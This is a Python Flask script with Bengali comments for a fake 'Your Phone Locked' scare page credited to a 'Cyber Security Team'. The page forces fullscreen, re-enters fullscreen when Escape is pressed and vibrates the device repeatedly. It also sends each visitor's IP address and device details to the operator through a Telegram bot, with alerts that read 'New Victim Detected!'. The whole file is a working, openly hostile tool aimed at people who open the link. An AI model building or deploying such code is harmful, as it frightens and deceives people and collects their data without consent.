import os
import time
from flask import Flask, request, jsonify, render_template_string
import telebot

app = Flask(__name__)

# ---------------------------------------------
# 1. টেলিগ্রাম বটের টোকেন ও চ্যাট আইডি
# ---------------------------------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID   = os.environ.get("CHAT_ID")

bot = telebot.TeleBot(BOT_TOKEN)

# ---------------------------------------------
# 2. ভিক্টিমের ডেটা সংগ্রহের জন্য লিস্ট
# ---------------------------------------------
victims = []

# ---------------------------------------------
# 3. হোম পেজের HTML (ভিক্টিমের স্ক্রিনে দেখাবে)
# ---------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Cyber Security Team</title>
    <style>
        body{margin:0;padding:0;background:#000;color:#fff;font-family:'Courier New',monospace;overflow:hidden;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;}
        .lock-icon{font-size:80px;margin-bottom:20px;animation:pulse 1.5s infinite;}
        @keyframes pulse{0%{transform:scale(1);opacity:1;}50%{transform:scale(1.1);opacity:0.8;}100%{transform:scale(1);opacity:1;}}
        h1{font-size:28px;color:#ff3333;border:2px solid #ff3333;padding:10px;margin-bottom:20px;box-shadow:0 0 15px #ff3333;text-transform:uppercase;}
        p{font-size:18px;margin:10px 0;}
    </style>
</head>
<body>
    <div class="lock-icon">🔒</div>
    <h1>Your Phone Locked</h1>
    <p>By Cyber Security Team</p>
    <p id="status">Collecting Data...</p>
    <p style="font-size:12px;color:#888;">Do not close this window!</p>
    <script>
        // ফুল স্ক্রিনে যাওয়া
        function goFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
        }

        window.onload = function() {
            goFullscreen();

            // ভাইব্রেশন চালু রাখা (যদি সাপোর্ট করে)
            if ('vibrate' in navigator) {
                setInterval(() => navigator.vibrate([200, 100, 200]), 500);
            }

            // ডেটা পাঠানো
            fetch('/send_data', {method:'POST'})
                .then(r=>r.json())
                .then(d=>{
                    document.getElementById('status').innerText = "Data Sent Successfully";
                    document.getElementById('status').style.color = "#00ff00";
                });

            // প্রতি ৫ সেকেন্ডে পিং
            setInterval(() => fetch('/ping'), 5000);
        };

        // ESC চাপলে আবার ফুল স্ক্রিনে যাওয়া
        document.addEventListener('keydown', e=>{
            if (e.key === "Escape") goFullscreen();
        });
    </script>
</body>
</html>
"""

# ---------------------------------------------
# 4. রুটস
# ---------------------------------------------
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send_data', methods=['POST'])
def send_data():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # ডিভাইসের নাম বের করা (সাধারণ ফরম্যাট অনুযায়ী)
    if ')' in user_agent:
        device = user_agent.split(')')[0] + ')'
    else:
        device = user_agent

    victim_info = {
        "ip": ip,
        "device": device,
        "time": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    }
    victims.append(victim_info)

    # টেলিগ্রাম মেসেজ
    msg = f"🔥 **New Victim Detected!**\n\n📱 IP: `{ip}`\n📲 Device: `{device}`\n\nUse /unlock to reset."
    try:
        bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
    except Exception as e:
        print(f"Telegram error: {e}")

    return jsonify({"status":"success","message":"Data captured"})

@app.route('/ping')
def ping():
    return "ok"

# ---------------------------------------------
# 5. টেলিগ্রাম বট কমান্ড
# ---------------------------------------------
@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "Welcome Admin. Use /unlock to notify victims.")

@bot.message_handler(commands=['unlock'])
def unlock_devices(message):
    if str(message.chat.id) == CHAT_ID:
        bot.reply_to(message, "✅ **System Unlocked!**\nAll victims will receive a notification.")
    else:
        bot.reply_to(message, "🚫 Access Denied! You are not Admin.")

# ---------------------------------------------
# 6. অ্যাপ চালু করা
# ---------------------------------------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
